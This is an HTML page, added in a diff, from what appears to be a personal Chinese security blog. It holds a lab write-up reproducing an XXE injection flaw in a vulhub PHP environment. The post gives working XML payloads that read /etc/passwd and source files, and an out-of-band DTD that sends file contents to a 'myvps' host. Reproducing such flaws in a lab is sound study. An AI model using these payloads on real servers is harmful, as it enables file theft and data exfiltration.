@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>php_xxe | Yyx</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1622952381444">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="php_xxe
+1.漏洞复现
+1）环境安装
+使用vulhub里面的php_xxe
+2) 漏洞复现
+漏洞介绍
+XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安..." />
+    <meta name="keywords" content="漏洞复现" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://www.yyxyy.xyz/">
+        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1622952381444" class="site-logo">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      记得在这杂乱的生活里，带点微笑
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">php_xxe</h2>
+            <div class="post-date">2021-06-06</div>
+            
+            <div class="post-content" v-pre>
+              <h3 id="php_xxe">php_xxe</h3>
+<h4 id="1漏洞复现">1.漏洞复现</h4>
+<h5 id="1环境安装">1）环境安装</h5>
+<p>使用vulhub里面的php_xxe</p>
+<h5 id="2-漏洞复现">2) 漏洞复现</h5>
+<p>漏洞介绍</p>
+<p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
+<p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题。</p>
+<p>漏洞利用</p>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<p>payload:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/1.png" alt="" loading="lazy"></figure>
+<p>这个环境里面***dom.php、SimpleXMLElement.php 、simplexml_load_string.php***三个页面都存在这个漏洞。</p>
+<h5 id="3漏洞分析">3)漏洞分析</h5>
+<p>simplexml_load_string函数解析body，查看一下源码simplexml_load_string.php</p>
+<pre><code class="language-php">&lt;?php
+$data = file_get_contents('php://input');
+$xml = simplexml_load_string($data);
+
+echo $xml-&gt;name;
+
+</code></pre>
+<p>​	//先将xml发送给服务器解析，服务器解析完成后，就会按照我们的xml执行。当执行到**SYSTEM &quot;file:///etc/passwd&quot;**时，</p>
+<p>会引用服务器里面的/etc/passwd文件，当服务器解析完成后，会将/etc/passwd文件内容存入&amp;xxe中，然后将数据返回给恶意访问者。</p>
+<p>使用php伪协议</p>
+<p>除了使用前面的payload。我们发现源码有<strong>php://input</strong>,因此可以使用php伪协议读取源码。</p>
+<p>payload：</p>
+<pre><code class="language-xml">
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;
+]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/2.png" alt="" loading="lazy"></figure>
+<p>当没有回显的时候。</p>
+<p>就要想办法让服务器自己把数据往外带。</p>
+<p>我们可以写两个外部参数实体，第一个用来请求本地数据内容，第二个用 http 协议或者其他协议把请求到的数据作为参数带到我们的 vps，这样就实现了数据外带了。</p>
+<p>payload</p>
+<pre><code class="language-xml-dtd">
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % remote SYSTEM &quot;http://myvps/xml.dtd&quot;&gt;  
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/test.txt&quot;&gt;
+    %remote;
+    %send;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;
+</code></pre>
+<p>xml.dtd</p>
+<pre><code class="language-xml-dtd">
+
+&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myvps:2333/?%file;'&gt;&quot;&gt;
+%start;
+</code></pre>
+<p>与此同时我们还需要在服务器上面打开2333端口</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/php_xxe/3.png" alt="" loading="lazy"></figure>
+<p>后面还有dos攻击‘探测内网等等。。。</p>
+<p>参考链接</p>
+<p><a href="https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw">https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw</a></p>
+<p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://www.yyxyy.xyz/tag/RIn8eHN5X/" class="tag">
+                    漏洞复现
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://www.yyxyy.xyz/post/ssti-lou-dong-fu-xian/">
+                  <h3 class="post-title">
+                    ssti漏洞复现
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
